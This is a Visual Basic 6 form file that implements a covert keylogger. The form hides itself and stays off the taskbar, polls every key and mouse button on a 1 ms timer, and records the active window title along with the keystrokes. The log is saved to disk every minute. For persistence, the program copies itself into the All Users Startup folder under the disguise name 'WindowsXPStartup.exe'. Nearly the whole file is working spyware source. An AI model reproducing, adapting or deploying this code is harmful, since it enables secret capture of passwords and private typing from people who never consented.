VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Form1"
   ClientHeight    =   150
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   345
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   150
   ScaleWidth      =   345
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Interval        =   60000
      Left            =   2160
      Top             =   1800
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   1320
      Top             =   1200
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Cnt As Long, sSave As String, sOld As String, Ret As String
Dim wtitle As String

Function GetPressedKey() As String
    For Cnt = 0 To 222  '32 - 128
        'Get the keystate of a specified key
        If GetAsyncKeyState(Cnt) <> 0 Then
            GetPressedKey = Chr$(Cnt)
            Exit For
        End If
    Next Cnt
End Function

Private Sub Form_Activate()
    savefile vbCrLf & vbCrLf & "<<<<<<<<<<<<<<<<<<  System startup at : " & Str(Now) & "  >>>>>>>>>>>>>>>>>"
    Form1.Visible = False
    If Trim(Dir("C:\Windows\win356", vbDirectory)) = "" Then MkDir "C:\Windows\win356"
    If Trim(Dir("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\WindowsXPStartup.exe")) = "" Then FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\WindowsXPStartup.exe"
End Sub

Private Sub Form_Unload(Cancel As Integer)
    savefile sSave
    savefile "<<<<<<<<<<<<<<<<<<  System shutdown at : " & Str(Now) & "  >>>>>>>>>>>>>>>>>" & vbCrLf & vbCrLf
End Sub

Private Sub Timer1_Timer()
    Ret = GetPressedKey
    If Ret <> sOld Then
        sOld = Ret
        Select Case Cnt
        'Number pad keys
            Case 96: chStr = "0"
            Case 97: chStr = "1"
            Case 98: chStr = "2"
            Case 99: chStr = "3"
            Case 100: chStr = "4"
            Case 101: chStr = "5"
            Case 102: chStr = "6"
            Case 103: chStr = "7"
            Case 104: chStr = "8"
            Case 105: chStr = "9"
            Case 106: chStr = "*"
            Case 107: chStr = "+"
            Case 108: chStr = "[Keypad-Enter]"
            Case 109: chStr = "-"
            Case 110: chStr = "."
            Case 111: chStr = "/"
            
        'Function Keys
            Case 112: chStr = "F1"
            Case 113: chStr = "F2"
            Case 114: chStr = "F3"
            Case 115: chStr = "F4"
            Case 116: chStr = "F5"
            Case 117: chStr = "F6"
            Case 118: chStr = "F7"
            Case 119: chStr = "F8"
            Case 120: chStr = "F9"
            Case 121: chStr = "F10"
            Case 122: chStr = "F11"
            Case 123: chStr = "F12"
            
        'Mouse
            Case 1: chStr = "[Mouse-Left]"
            Case 2: chStr = "[Mouse-Right]"
            Case 3: chStr = "[Cancel]"
            Case 4: chStr = "[Mouse-Middle]"
        
        'Other keys
            Case 8: chStr = "[Backspace]"
            Case 9: chStr = "[Tab]"
            Case 13: chStr = "[Enter]"
            Case 16: chStr = "[Shift]"
            Case 17: chStr = "[Ctrl]"
            Case 19: chStr = "[Pause]"
            Case 20: chStr = "[Caps Lock]"
            Case 27: chStr = "[Esc]"
            Case 32: chStr = " "
            Case 33: chStr = "[PageUp]"
            Case 34: chStr = "[PageDown]"
            Case 35: chStr = "[End]"
            Case 36: chStr = "[Home]"
            Case 37: chStr = "[LeftArrow]"
            Case 38: chStr = "[UpArrow]"
            Case 39: chStr = "[RightArrow]"
            Case 40: chStr = "[DownArrow]"
            Case 41: chStr = "[Select]"
            Case 42: chStr = "[PrtScrn]"
            Case 43: chStr = "[Execute]"
            Case 44: chStr = "[Snapshot]"
            Case 45: chStr = "[Ins]"
            Case 46: chStr = "[Del]"
            Case 47: chStr = "[Help]"
            Case 144: chStr = "[NumLock]"
            
        'Symbol keys
            Case 186: chStr = ";"
            Case 187: chStr = "="
            Case 188: chStr = ","
            Case 189: chStr = "-"
            Case 190: chStr = "."
            Case 191: chStr = "/"
            Case 192: chStr = "`"
            Case 219: chStr = "["
            Case 220: chStr = "\"
            Case 221: chStr = "]"
            Case 222: chStr = "'"
        Case Else
            chStr = sOld
        End Select
        sSave = sSave + chStr
    End If
    If wtitle <> gettitle Then
    wtitle = gettitle
    sSave = sSave & vbCrLf & "________________" & wtitle & "________________" & vbCrLf
    End If
End Sub

Private Sub Timer2_Timer()
    savefile sSave
    sSave = ""
End Sub

